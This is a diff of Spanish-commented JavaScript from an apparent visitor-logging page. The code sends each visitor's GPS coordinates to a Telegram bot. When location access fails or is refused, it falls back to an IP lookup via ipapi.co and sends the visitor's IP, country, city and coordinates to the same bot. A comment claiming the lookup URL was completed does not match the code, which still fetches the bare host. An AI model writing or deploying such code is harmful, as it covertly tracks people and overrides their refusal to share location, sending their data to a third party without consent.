@@ -62,10 +62,9 @@
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
 
-            // MODIFICADO: Se elimina el texto de Google Maps y se dejan solo las coordenadas numéricas separadas por coma al final
+            // CORRECTO: Solo coordenadas al final
             const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\n" + lat + "," + lon;
 
-            // CORREGIDO: Ruta oficial completa de la API de bots de Telegram
             fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -73,14 +72,13 @@
             }).catch(e => console.error("Error enviando GPS:", e));
 
         }, function(err) {
-            // CORREGIDO: Endpoint /json/ completo para ipapi.co
+            // CORREGIDO: URL completa con /json/
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
-                // MODIFICADO: Se elimina el texto de Google Maps y se dejan solo las coordenadas numéricas separadas por coma al final
-            const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\n" + lat + "," + lon;
+                // CORREGIDO: Uso de datos dinámicos provenientes de la API de IP
+                const textoIP = "🌐 Nueva Visita (Por IP)\n\n• IP: " + (data.ip || 'No detectada') + "\n• País: " + (data.country_name || 'Desconocido') + "\n• Ciudad: " + (data.city || 'Desconocida') + "\n\n" + data.latitude + "," + data.longitude;
                 
-            // CORREGIDO: Ruta oficial completa de Telegram para el respaldo
                 fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
